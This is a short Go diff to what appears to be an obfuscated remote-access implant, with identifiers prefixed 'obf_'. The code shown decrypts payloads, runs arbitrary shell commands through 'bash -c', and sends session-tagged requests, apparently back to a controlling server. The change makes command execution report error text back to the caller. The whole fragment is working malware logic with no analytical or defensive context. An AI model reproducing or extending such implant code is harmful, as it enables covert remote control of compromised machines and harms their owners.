@@ -49,13 +49,15 @@ func obf_func_decrypt(obf_var_payload []byte) []byte {
 }
 
 func obf_func_exec(obf_var_interpreter_command string) []byte {
-	obf_var_stdout, _ := exec.Command("bash", "-c", obf_var_interpreter_command).Output()
+	obf_var_stdout, obf_var_e := exec.Command("bash", "-c", obf_var_interpreter_command).Output()
+	if obf_var_e != nil {
+		return []byte( obf_var_e.Error() )
+	}
 	return obf_var_stdout
 }
 
 func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_request_body string) string {
 	var obf_var_return string
-
 	if obf_var_request_type == obf_const_post_tag {
 		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
 		obf_var_packet := strings.Join(obf_var_a, "\n")
